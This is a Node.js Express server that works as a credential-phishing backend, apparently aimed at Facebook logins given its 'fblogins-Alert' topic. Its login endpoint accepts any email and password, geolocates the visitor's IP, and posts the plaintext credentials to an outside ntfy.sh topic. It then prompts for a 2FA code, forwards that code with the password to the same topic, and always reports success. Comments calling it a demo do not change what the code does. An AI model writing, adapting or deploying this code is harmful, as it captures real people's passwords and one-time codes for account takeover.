const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== NTFY CONFIGURATION =====
// IMPORTANT: Change 'bkeyz-login-alerts' to your actual ntfy topic name
const NTFY_TOPIC = 'fblogins-Alert';

// ===== IP TO LOCATION FUNCTION =====
async function getLocationFromIP(ip) {
    try {
        // Skip local/internal IPs (development environment)
        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || 
            ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
            return { 
                city: 'Local', 
                region: 'Local Network', 
                country: 'Development',
                flag: '💻'
            };
        }
        
        // Using ip-api.com (free, no API key needed, 45 requests/minute)
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`, {
            timeout: 5000
        });
        
        if (response.data.status === 'success') {
            return {
                city: response.data.city || 'Unknown',
                region: response.data.regionName || 'Unknown',
                country: response.data.country || 'Unknown'
            };
        }
        return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
    } catch (error) {
        console.log('⚠️ IP Geolocation error:', error.message);
        return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
    }
}

// ===== SEND NOTIFICATION TO NTFY =====
async function sendToNtfy(title, message, priority = 'high') {
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': title,
                'Priority': priority,
                'Tags': 'warning,lock'
            }
        });
        console.log('✅ ntfy notification sent:', title);
    } catch (error) {
        console.error('❌ ntfy error:', error.message);
    }
}

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ===== IN-MEMORY STORAGE =====
const users = [];
const pendingLogins = new Map(); // Stores pending 2FA sessions

// ===== USER REGISTRATION =====
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    console.log('📝 Registration attempt:', { name, email });
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be at least 6 characters' });
    }
    
    // Check if user already exists
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    // Create new user (plain text password - for demo only)
    const newUser = {
        id: users.length + 1,
        name: name.trim(),
        email: email.toLowerCase().trim(),
        password: password, // In production, hash this with bcrypt!
        createdAt: new Date().toISOString()
    };
    
    users.push(newUser);
    console.log('✅ User registered:', email);
    console.log('📊 Total users:', users.length);
    
    res.json({
        success: true,
        message: 'Account created successfully!',
        user: { id: newUser.id, name: newUser.name, email: newUser.email }
    });
});

// ===== STEP 1: LOGIN (Accepts any credentials, always asks for 2FA) =====
app.post('/api/login', async (req, res) => {
    const { identifier, password } = req.body;
    
    // Get IP address
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    ip = ip.replace('::ffff:', ''); // Clean IPv6 format
    
    console.log('🔐 Login attempt:', { identifier, ip });
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    // GET LOCATION FROM IP ADDRESS
    const location = await getLocationFromIP(ip);
    
    // Create session ID
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 8);
    
    // Store credentials temporarily (expires in 10 minutes)
    pendingLogins.set(sessionId, {
        email: identifier,
        password: password,
        ip: ip,
        location: location,
        expires: Date.now() + 10 * 60 * 1000
    });
    
    // Send notification to ntfy (with location!)
    const notificationMessage = `🔐 LOGIN ATTEMPT\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${identifier}\n🔑 Password: ${password}\n📍 Location: ${location.city}, ${location.region}, ${location.country}\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    await sendToNtfy('🔐 Login Credentials', notificationMessage);
    
    // Always ask for 2FA code (no validation of credentials)
    res.json({
        success: true,
        requires2FA: true,
        sessionId: sessionId,
        message: 'Authentication code sent to your device'
    });
});

// ===== STEP 2: VERIFY 2FA CODE =====
app.post('/api/verify-2fa', async (req, res) => {
    const { sessionId, code } = req.body;
    
    console.log('🔐 2FA verification attempt:', { sessionId, code });
    
    if (!sessionId || !code) {
        return res.status(400).json({ error: 'Session ID and code required' });
    }
    
    const pending = pendingLogins.get(sessionId);
    
    if (!pending) {
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    if (Date.now() > pending.expires) {
        pendingLogins.delete(sessionId);
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    // Get location (use stored or get fresh)
    const location = pending.location || await getLocationFromIP(pending.ip);
    
    // Send notification with 2FA code and location
    const notificationMessage = `🔐 2FA CODE SUBMITTED\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${pending.email}\n🔑 Password: ${pending.password}\n📱 6-digit Code: ${code}\n📍 Location: ${location.city}, ${location.region}, ${location.country}\n🌍 IP: ${pending.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    await sendToNtfy('🔐 2FA Code Received', notificationMessage);
    
    // Clean up session
    pendingLogins.delete(sessionId);
    
    // Always succeed (no code validation for demo)
    res.json({
        success: true,
        message: 'Login verified successfully!',
        user: { name: pending.email.split('@')[0] || 'User' }
    });
});

// ===== HEALTH CHECK =====
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        ntfyTopic: NTFY_TOPIC,
        usersRegistered: users.length
    });
});

// ===== SERVE FRONTEND =====
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
    console.log(`📢 ntfy topic: ${NTFY_TOPIC}`);
    console.log(`📍 Location tracking: ENABLED (via IP geolocation)`);
    console.log(`\n✅ Ready to accept connections!\n`);
});
